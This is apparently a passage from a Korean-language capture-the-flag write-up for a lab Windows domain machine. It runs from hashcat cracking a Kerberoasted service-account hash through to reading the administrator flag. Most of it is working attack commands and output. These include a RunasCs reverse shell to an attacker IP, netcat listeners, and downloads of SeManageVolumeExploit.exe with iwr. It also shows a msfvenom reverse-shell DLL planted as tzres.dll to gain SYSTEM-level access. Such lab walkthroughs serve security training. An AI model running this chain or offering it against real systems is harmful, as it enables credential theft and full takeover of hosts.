Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (22011 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$ad528ae4d9a9705520eea35c2ca46749$c93f282ca2434f2a6714e7ce33dfad88ee12131382214681d7cd6e586c6e9e5021fad225d083a71116612cb49347e2627ea6577b166c54886a07b98d2aadf13f8bda87430a494dd68ee8248cfda0d6780f84f8bc748cf2bf09e2d27a967463c1833237f91b7965d7cb13e93aae94dbb164223ae3ccb873e2cea9bf4411c402d8e3353c38b276d20390785b16609e8de51c7931b9d15607849a79181f50bae873a29620070bed98d0ab3c028cecbb3ac73e025d48bcd0d42c232f2ccf5a64804d2d4b182b2a0a7412c0e9de3c5833cc0c6d2068398e62849a56866697f879af31881dda07dbc45eb9de4f6ba5e4f1fe225a228e1457eb235a5c2943cf32de8b340a04f4b81cd2dc99a19cde6a5f0f4b9f3929cba51e0dd29b750a927b84d93acb131a9b80d8e76f16ddc19f9367b9eaf6b2db2f41a370949f67ee16ba4af0426b5469e0ea7a22f7b837db9541d336495da48049985d0e61b7fd5599b91427bd5a70474886b8203e7429780147cc322d6663277e7d09eb740d1cd89ea4cb9905b95386d597832294eb1f118e179989ee3c10b80cbda689849b0331e8d2973bd609dce0e196b4d2e851a99862c57adef99446f2384c8251f4dd070f2db1f7f70e6754d24df74272f66df7a7939175d697f765cb9feb36d4b0c2a7382380a7abf03aeff4b4077674643591d73be73c1ced2e764731bc39b91e50f5aae9058d327ea91559e1127a334c8235faffa94cf1ca7a9f5097a3310da00e8dd641288ba19821f39b04927e69af6d34a583d020159e78f08053b44187eb502b0af980308bf2867bc8b99e10382fd9cb3dafebc3f18b5cee9b467381eb022366ac5ef4a61672f7eef99f09efc9ecc0584ee71b92c24349b72c38c9aec834c6d8088e66c9472287e07dacc6869e32fa31f7e6edb340065037980217011ae51eeb2bef3c3781c45b9c7cac37dab81595f351e80d43b78312fa8dcb98df617b53ebadb4b56fb9e12cde17bf83179847f28bea23022b788e6030832c0552c842979efdbfabc5f1116509bf267c5619f9fa41a6a494329926f4b5012d841f87fc1aa88e887a3179331f9c7f461dff293f08911a947aea11f653ba894a9d4c42e07a3454f4830ef5375c9adf14f58d12caf6a226ba3d15d4890bdc494fe223eb66b2544a920a20b602469609d8c3b558dba3a540c4096567f2faa41abcd81f971510ee97411c9c4f3d267d123fa1447c393bc3fad48607c1222704e20404ddff8e21cda1f7074d3d747a5846efc7e6283e36c48b18f9836e713e6c9fa428a80560f86db6345e8e138d89d1c8f19e6cd78ec94c1b3d61c76ec539839732b257831e0a5db661bba067ab7a8f4c637f14fad3a5c052e67919f87f692f23c3de19ecb6444ff02c06e8cb45af255835021cf8979f1d91d9f6772d62e1fbfa6346313a46dd7f1d4287b41b7f86953cd0dedaabd3df3d747929d5e19ff66ab7d5b5f8b321a878122586400d5a58c72683d5fc54652db0833fb15953430e8040b428125dfea52ec566ae38ab8653ef3648371ac266d5e55bff209eb994fe96fbe843305b7dcbd145de782a6932bb316a66c9e46abdeff1cd015051b08aeff191:trustno1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...eff191
Time.Started.....: Wed Jul  1 16:12:09 2026 (0 secs)
Time.Estimated...: Wed Jul  1 16:12:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    70663 H/s (1.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 24%

Started: Wed Jul  1 16:11:57 2026
Stopped: Wed Jul  1 16:12:10 2026
```

획득한 자격증명으로  RunasCs 실행
```bash
PS C:\Users\svc_apache\Desktop> . .\Invoke-RunasCs.ps1
. .\Invoke-RunasCs.ps1
PS C:\Users\svc_apache\Desktop> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.182:443
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.182:443
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-45f4f$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 4208 created in background.

PS C:\Users\svc_apache\Desktop>
```

리버스쉘 연결
```bash
┌──(kali㉿kali)-[~/git/RunasCs]
└─$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.193.187] 51812
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd :
cd :
The filename, directory name, or volume label syntax is incorrect.

C:\Windows\system32>cd c:\
cd c:\

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of c:\

06/30/2026  05:07 PM             2,666 output.txt
05/28/2021  04:20 AM    <DIR>          PerfLogs
05/28/2021  06:06 AM    <DIR>          Program Files
05/28/2021  03:53 AM    <DIR>          Program Files (x86)
04/08/2022  02:40 AM    <DIR>          Users
04/08/2022  02:11 AM    <DIR>          Windows
05/28/2021  06:04 AM    <DIR>          Windows10Upgrade
04/08/2022  02:36 AM    <DIR>          xampp
               1 File(s)          2,666 bytes
               7 Dir(s)  13,750,947,840 bytes free

c:\>cd users
cd users

c:\Users>cd svc_mssql
cd svc_mssql

c:\Users\svc_mssql>cd desktop
cd desktop

c:\Users\svc_mssql\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of c:\Users\svc_mssql\Desktop

04/08/2022  02:40 AM    <DIR>          .
04/08/2022  02:40 AM    <DIR>          ..
06/30/2026  05:07 PM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)  13,750,943,744 bytes free

c:\Users\svc_mssql\Desktop>type local.txt
type local.txt
157b121df183ad16091ae444bf78671e
```


측면이동
```bash
c:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

https://github.com/gtworek/priv2admin 윈도우 권한 대조 
https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html


semanagevolumexplit.exe 실행
```bash
PS C:\Users\svc_mssql\Desktop> iwr http://192.168.45.182/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
iwr http://192.168.45.182/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
PS C:\Users\svc_mssql\Desktop>

PS C:\Users\svc_mssql\Desktop> dir
dir


    Directory: C:\Users\svc_mssql\Desktop


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
-a----        6/30/2026   5:07 PM             34 local.txt                                            
-a----         7/1/2026  12:48 AM          12288 SeManageVolumeExploit.exe                            


PS C:\Users\svc_mssql\Desktop> .\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 932
DONE
PS C:\Users\svc_mssql\Desktop> whoami /priv
whoami /priv
```

tzres.dll 변조 
```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f dll -o tzres.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: tzres.dll
```

tzres.dll 이동
```bash
PS C:\Users\svc_mssql\Desktop> iwr http://192.168.45.182/tzres.dll -o tzres.dll
iwr http://192.168.45.182/tzres.dll -o tzres.dll
PS C:\Users\svc_mssql\Desktop> ls
ls


    Directory: C:\Users\svc_mssql\Desktop


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
-a----        6/30/2026   5:07 PM             34 local.txt                                            
-a----         7/1/2026  12:48 AM          12288 SeManageVolumeExploit.exe                            
-a----         7/1/2026   1:30 AM           9216 tzres.dll   
```

tzres.dll 이동 후 실행
```bash 
PS C:\windows\system32\wbem> mv C:\Users\svc_mssql\Desktop\tzres.dll .
mv C:\Users\svc_mssql\Desktop\tzres.dll .

PS C:\windows\system32\wbem> systeminfo
systeminfo
ERROR: The remote procedure call failed.
```

대기 시켜놓은 리버스쉘 연결
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.193.187] 52066
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\network service

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of c:\Users\Administrator\Desktop

04/08/2022  02:40 AM    <DIR>          .
04/08/2022  02:40 AM    <DIR>          ..
06/30/2026  05:07 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  13,720,031,232 bytes free

c:\Users\Administrator\Desktop>type proof.txt
type proof.txt
9eafbfd6e9afb54df4fb764ef5d00e02
```
![[Pasted image 20260701173555.png]]